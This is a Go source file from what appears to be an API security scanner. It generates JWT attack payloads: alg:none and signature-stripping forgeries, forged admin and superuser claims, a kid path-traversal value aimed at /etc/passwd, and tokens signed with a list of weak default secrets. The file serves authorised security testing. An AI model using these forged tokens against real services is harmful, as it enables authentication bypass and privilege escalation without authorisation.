package payloads

import (
	"crypto/hmac"
	"crypto/sha256"
	"encoding/base64"
	"strings"

	"github.com/su1ph3r/indago/pkg/types"
)

// JWTGenerator generates JWT manipulation attack payloads
type JWTGenerator struct{}

// NewJWTGenerator creates a new JWT manipulation payload generator
func NewJWTGenerator() *JWTGenerator {
	return &JWTGenerator{}
}

// Type returns the attack type
func (g *JWTGenerator) Type() string {
	return types.AttackJWT
}

// Generate generates JWT manipulation payloads for a parameter
func (g *JWTGenerator) Generate(endpoint types.Endpoint, param *types.Parameter) []Payload {
	var payloads []Payload

	// Target authentication-related parameters
	if !g.isJWTRelevant(param, endpoint) {
		return payloads
	}

	// Algorithm confusion payloads
	payloads = append(payloads, g.algorithmConfusionPayloads()...)

	// Signature bypass payloads
	payloads = append(payloads, g.signatureBypassPayloads()...)

	// Claim manipulation payloads
	payloads = append(payloads, g.claimManipulationPayloads()...)

	// Weak secret testing payloads
	payloads = append(payloads, g.weakSecretPayloads()...)

	return payloads
}

// isJWTRelevant checks if parameter might contain JWT tokens.
//
// If the endpoint already has an Authorization header parameter (e.g.
// synthesized by the parser), JWT payloads should only be generated for
// that parameter to avoid duplicates and mis-positioned payloads.
func (g *JWTGenerator) isJWTRelevant(param *types.Parameter, endpoint types.Endpoint) bool {
	// If the endpoint has an explicit Authorization header parameter,
	// only generate JWT payloads for that specific parameter.
	if hasAuthorizationHeader(endpoint) {
		return param.In == "header" && strings.EqualFold(param.Name, "Authorization")
	}

	// No Authorization header parameter exists — fall back to broad matching
	// but mark this with metadata so the generator can override position.
	nameLower := strings.ToLower(param.Name)
	pathLower := strings.ToLower(endpoint.Path)

	// JWT-related parameter names
	jwtPatterns := []string{
		"token", "jwt", "auth", "authorization", "bearer",
		"access_token", "id_token", "refresh_token",
		"session", "credential", "key",
	}

	for _, pattern := range jwtPatterns {
		if strings.Contains(nameLower, pattern) {
			return true
		}
	}

	// JWT-related endpoints
	jwtEndpoints := []string{
		"/auth", "/login", "/oauth", "/token",
		"/verify", "/validate", "/session",
		"/api", "/protected", "/secure",
	}

	for _, ep := range jwtEndpoints {
		if strings.Contains(pathLower, ep) {
			return true
		}
	}

	// Check if parameter is in header position
	if param.In == "header" && (strings.Contains(nameLower, "auth") || nameLower == "authorization") {
		return true
	}

	// Check if endpoint has bearer auth configured (e.g., from OpenAPI securitySchemes)
	if endpoint.Auth != nil && (endpoint.Auth.Type == "bearer" || endpoint.Auth.Type == "oauth2") {
		return true
	}

	// Check for common authenticated API path patterns (excluding overly broad matches like /api/ and /users/)
	authPaths := []string{"/admin/", "/protected/", "/account/", "/profile/"}
	for _, ap := range authPaths {
		if strings.Contains(pathLower, ap) {
			return true
		}
	}

	return false
}

// hasAuthorizationHeader checks whether the endpoint has an Authorization header parameter.
func hasAuthorizationHeader(endpoint types.Endpoint) bool {
	for _, p := range endpoint.Parameters {
		if strings.EqualFold(p.Name, "Authorization") && strings.EqualFold(p.In, "header") {
			return true
		}
	}
	return false
}

// algorithmConfusionPayloads generates algorithm confusion attack payloads
func (g *JWTGenerator) algorithmConfusionPayloads() []Payload {
	// alg:none attack - header: {"alg":"none","typ":"JWT"}
	algNoneHeader := base64.RawURLEncoding.EncodeToString([]byte(`{"alg":"none","typ":"JWT"}`))
	// Payload with admin claim: {"sub":"admin","role":"admin","iat":1516239022}
	adminPayload := base64.RawURLEncoding.EncodeToString([]byte(`{"sub":"admin","role":"admin","iat":1516239022}`))

	// alg:None (case variation)
	algNoneUpperHeader := base64.RawURLEncoding.EncodeToString([]byte(`{"alg":"None","typ":"JWT"}`))

	// alg:NONE (all caps)
	algNoneAllCapsHeader := base64.RawURLEncoding.EncodeToString([]byte(`{"alg":"NONE","typ":"JWT"}`))

	return []Payload{
		{
			Value:       algNoneHeader + "." + adminPayload + ".",
			Type:        types.AttackJWT,
			Category:    "authentication",
			Description: "JWT alg:none attack",
			Metadata:    map[string]string{"attack": "algorithm_confusion", "alg": "none"},
		},
		{
			Value:       algNoneUpperHeader + "." + adminPayload + ".",
			Type:        types.AttackJWT,
			Category:    "authentication",
			Description: "JWT alg:None attack (case variation)",
			Metadata:    map[string]string{"attack": "algorithm_confusion", "alg": "None"},
		},
		{
			Value:       algNoneAllCapsHeader + "." + adminPayload + ".",
			Type:        types.AttackJWT,
			Category:    "authentication",
			Description: "JWT alg:NONE attack (uppercase)",
			Metadata:    map[string]string{"attack": "algorithm_confusion", "alg": "NONE"},
		},
		{
			// HS256 with empty key
			Value:       base64.RawURLEncoding.EncodeToString([]byte(`{"alg":"HS256","typ":"JWT"}`)) + "." + adminPayload + ".",
			Type:        types.AttackJWT,
			Category:    "authentication",
			Description: "JWT HS256 with empty signature",
			Metadata:    map[string]string{"attack": "empty_signature"},
		},
	}
}

// signatureBypassPayloads generates signature bypass attack payloads
func (g *JWTGenerator) signatureBypassPayloads() []Payload {
	adminPayload := base64.RawURLEncoding.EncodeToString([]byte(`{"sub":"admin","role":"admin","iat":1516239022}`))
	hs256Header := base64.RawURLEncoding.EncodeToString([]byte(`{"alg":"HS256","typ":"JWT"}`))

	return []Payload{
		{
			// Missing signature
			Value:       hs256Header + "." + adminPayload,
			Type:        types.AttackJWT,
			Category:    "authentication",
			Description: "JWT missing signature",
			Metadata:    map[string]string{"attack": "missing_signature"},
		},
		{
			// Null signature
			Value:       hs256Header + "." + adminPayload + ".null",
			Type:        types.AttackJWT,
			Category:    "authentication",
			Description: "JWT null signature",
			Metadata:    map[string]string{"attack": "null_signature"},
		},
		{
			// Empty signature
			Value:       hs256Header + "." + adminPayload + ".",
			Type:        types.AttackJWT,
			Category:    "authentication",
			Description: "JWT empty signature",
			Metadata:    map[string]string{"attack": "empty_signature"},
		},
		{
			// Invalid signature (random base64)
			Value:       hs256Header + "." + adminPayload + ".AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
			Type:        types.AttackJWT,
			Category:    "authentication",
			Description: "JWT invalid signature (zeros)",
			Metadata:    map[string]string{"attack": "invalid_signature"},
		},
		{
			// Truncated signature
			Value:       hs256Header + "." + adminPayload + ".abc",
			Type:        types.AttackJWT,
			Category:    "authentication",
			Description: "JWT truncated signature",
			Metadata:    map[string]string{"attack": "truncated_signature"},
		},
	}
}

// claimManipulationPayloads generates claim manipulation attack payloads
func (g *JWTGenerator) claimManipulationPayloads() []Payload {
	hs256Header := base64.RawURLEncoding.EncodeToString([]byte(`{"alg":"HS256","typ":"JWT"}`))

	// Various manipulated claims
	claims := []struct {
		payload string
		desc    string
	}{
		{`{"sub":"1","role":"admin","iat":1516239022}`, "JWT admin role claim"},
		{`{"sub":"admin","admin":true,"iat":1516239022}`, "JWT admin:true flag"},
		{`{"sub":"1","role":"superuser","iat":1516239022}`, "JWT superuser role"},
		{`{"sub":"1","is_admin":true,"iat":1516239022}`, "JWT is_admin:true"},
		{`{"sub":"1","scope":"admin read write","iat":1516239022}`, "JWT expanded scope"},
		{`{"sub":"1","exp":9999999999,"iat":1516239022}`, "JWT far future expiry"},
		{`{"sub":"1","aud":"admin-api","iat":1516239022}`, "JWT admin audience"},
		{`{"sub":"1","groups":["admin","root"],"iat":1516239022}`, "JWT admin groups"},
		{`{"sub":"0","role":"user","iat":1516239022}`, "JWT user ID 0 (system)"},
		{`{"sub":"1","role":"user","kid":"../../../../../../etc/passwd","iat":1516239022}`, "JWT header injection via kid"},
	}

	var payloads []Payload
	for _, c := range claims {
		payload := base64.RawURLEncoding.EncodeToString([]byte(c.payload))
		payloads = append(payloads, Payload{
			Value:       hs256Header + "." + payload + ".invalidsig",
			Type:        types.AttackJWT,
			Category:    "authentication",
			Description: c.desc,
			Metadata:    map[string]string{"attack": "claim_manipulation"},
		})
	}

	return payloads
}

// signHS256 creates a valid HS256-signed JWT with the given secret
func signHS256(headerB64, payloadB64, secret string) string {
	signingInput := headerB64 + "." + payloadB64
	mac := hmac.New(sha256.New, []byte(secret))
	mac.Write([]byte(signingInput))
	sig := base64.RawURLEncoding.EncodeToString(mac.Sum(nil))
	return signingInput + "." + sig
}

// weakSecretPayloads generates payloads for testing weak JWT secrets
func (g *JWTGenerator) weakSecretPayloads() []Payload {
	headerB64 := base64.RawURLEncoding.EncodeToString([]byte(`{"alg":"HS256","typ":"JWT"}`))
	claimsB64 := base64.RawURLEncoding.EncodeToString([]byte(`{"sub":"1","role":"admin","iat":1516239022}`))

	weakSecrets := []string{
		// Original entries
		"secret", "password", "123456", "", "key",
		// Application defaults
		"super_secret", "supersecret", "super-secret",
		"my_secret", "mysecret", "my-secret",
		"jwt_secret", "jwtsecret", "jwt-secret",
		"app_secret", "appsecret", "app-secret",
		"secret_key", "secretkey", "secret-key",
		"private_key", "privatekey", "private-key",
		"signing_key", "signingkey", "signing-key",
		"token_secret", "tokensecret", "token-secret",
		// Framework defaults
		"change_me", "changeme", "change-me",
		"please_change", "pleasechange",
		"default", "default_secret",
		"example", "example_secret",
		"test", "testing", "test123",
		"development", "dev", "dev_secret",
		"production",
		// Common passwords used as secrets
		"admin", "administrator",
		"password123", "pass123", "p@ssw0rd",
		"letmein", "welcome",
		"1234567890", "12345678",
		"qwerty", "abc123",
		// VAmPI and known vulnerable app secrets
		"vampi_secret", "vampi",
		"flask_secret", "flask-secret",
		"django-insecure-secret", "django_secret",
		"node_secret", "express_secret",
		// Single words commonly used
		"auth", "token", "jwt", "api",
		"secure", "security",
		"master", "root",
		"access", "private",
		// Additional common single-word secrets
		"random", "none", "null", "true", "false",
		"1234", "pass", "login", "user",
		"secret1", "key1",
		"iloveyou", "monkey", "dragon", "shadow",
		"sunshine", "trustno1", "hunter2", "hello",
		"MyS3cr3t", "s3cr3t", "P@ssw0rd",
	}

	var payloads []Payload
	for _, s := range weakSecrets {
		desc := "JWT signed with weak secret '" + s + "'"
		metaSecret := s
		if s == "" {
			desc = "JWT signed with empty secret"
			metaSecret = "empty"
		}
		payloads = append(payloads, Payload{
			Value:       signHS256(headerB64, claimsB64, s),
			Type:        types.AttackJWT,
			Category:    "authentication",
			Description: desc,
			Metadata:    map[string]string{"attack": "weak_secret", "secret": metaSecret},
		})
	}
	return payloads
}
